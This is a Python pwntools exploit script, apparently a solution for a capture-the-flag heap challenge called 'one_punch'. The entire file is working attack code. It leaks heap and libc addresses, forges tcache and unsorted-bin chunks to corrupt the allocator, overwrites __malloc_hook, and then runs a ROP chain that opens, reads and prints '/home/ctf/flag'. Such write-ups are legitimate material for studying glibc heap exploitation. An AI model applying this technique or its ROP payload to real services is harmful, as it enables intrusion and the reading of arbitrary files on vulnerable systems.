#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('./src/one_punch'); context.arch = elf.arch
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def debut(idx, data, size=0):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', data if size == 0 else data.ljust(size)[:size])

def rename(idx, data, size=0):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', data if size == 0 else data.ljust(size, '\x00')[:size])

def show(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def retire(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(idx))


r = remote(HOST, PORT)

# leak heap
debut(0, 'a'*0x210)
_ = 'b'*0xe0 + flat(0x300, 0x20)
rename(0, _.ljust(0x210, 'b'))
retire(0)
debut(0, 'a'*0x210)
retire(0)
show(0)
r.recvuntil('hero name: ')
heap_base = u64(r.recv(6)+'\x00\x00') - 0x260
log.info('heap_base: {}'.format(hex(heap_base)))

# leak libc
for i in range(5):
    debut(0, 'a'*0x210)
    retire(0)
debut(0, 'a'*0x210)
debut(1, 'a'*0x210)
retire(0)
show(0)
r.recvuntil('hero name: ')
libc_base = u64(r.recv(6)+'\x00\x00') - 0x1e4ca0
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

debut(1, 'a'*0x210)

# forge size by tcache cnt
for i in range(3):
    debut(0, 'a'*0x3a0)
    retire(0)

# fill tcache 0x80 and 0x100
for i in range(7):
    debut(0, 'a'*0x80)
    retire(0)
for i in range(7):
    debut(0, 'a'*0x100)
    retire(0)

# free 0x21 chunk to tcache
retire(1)
debut(0, 'a'*0x80)
debut(1, 'a'*0x80)
retire(1)
retire(0)
debut(0, 'a'*0x210)
rename(0, 'a'*0x80 + flat(0, 0x21), 0x210)
retire(1)
retire(0)

# free 0x31 chunk to tcache
debut(0, 'a'*0x100)
debut(1, 'a'*0x80)
retire(1)
retire(0)
debut(0, 'a'*0x210)
rename(0, 'a'*0x100 + flat(0, 0x31), 0x210)
retire(1)
retire(0)

debut(1, 'a'*0x300) # size must bigger than 0x220 to overlap
for i in range(7):
    debut(0, 'a'*0x300)
    retire(0)
retire(1)
debut(0, 'a'*0x210)
retire(0)

# forge unsorted bin linked list
"""
tps = tcache_perthread_structure
ub_addr -> ub_0x220 -> ub_0x310 -> ub_addr
ub_addr -> ub_0x220 -> tc_0x30 -> tps -> tc_0x20 -> ub_0x310 -> ub_addr
"""
ub_addr = libc_base + 0x1e4ca0
ub_0x220 = heap_base + 0x1130
ub_0x310 = heap_base + 0x2be0
tps = heap_base + 0x40

debut(0, 'a'*0x210)
debut(1, 'a'*0x300)
retire(1)
retire(0)

tc_0 = flat(0, 0x21, ub_0x310, tps, 0x20, 0x20)
tc_1 = flat(0, 0x31, tps, ub_0x220, 'a'*0x10, 0x30, 0x20)
_ = flat(heap_base + 0x1250, ub_addr, 'a'*0x80, tc_0, 'a'*(0x80-len(tc_0)), tc_1)
rename(0, _)
rename(1, flat(ub_addr, heap_base + 0x11d0))

# overwrite tcache_0x220 to __malloc_hook
debut(0, 'a'*0x2f0) # tps size = 0x300
rename(0, flat('\x00'*0x100, libc.sym['__malloc_hook'], '\x00'*0x100))

# overwrite __malloc_hook
add_rsp_0x48 = libc_base + 0x8cfd6
r.sendlineafter('> ', '50056')
r.send(flat(add_rsp_0x48, 0, '/home/ctf/flag'))

# rip conrtol
pop_rdi = libc_base + 0x26542
pop_rsi = libc_base + 0x26f9e
pop_rdx = libc_base + 0x12bda6
pop_rax = libc_base + 0x47cf8
syscall_ret = libc_base + 0xcf6c5

path = libc.sym['__malloc_hook'] + 0x10
buf = path + 0x40
rop = flat(
    pop_rdi, path, pop_rsi, 0, pop_rax, 2, syscall_ret,
    pop_rdi, 3, pop_rsi, buf, pop_rdx, 0x30, libc.sym['read'],
    pop_rdi, 1, pop_rsi, buf, pop_rdx, 0x30, libc.sym['write']
)
debut(0, rop.ljust(0x400, '\x00'))

r.interactive()
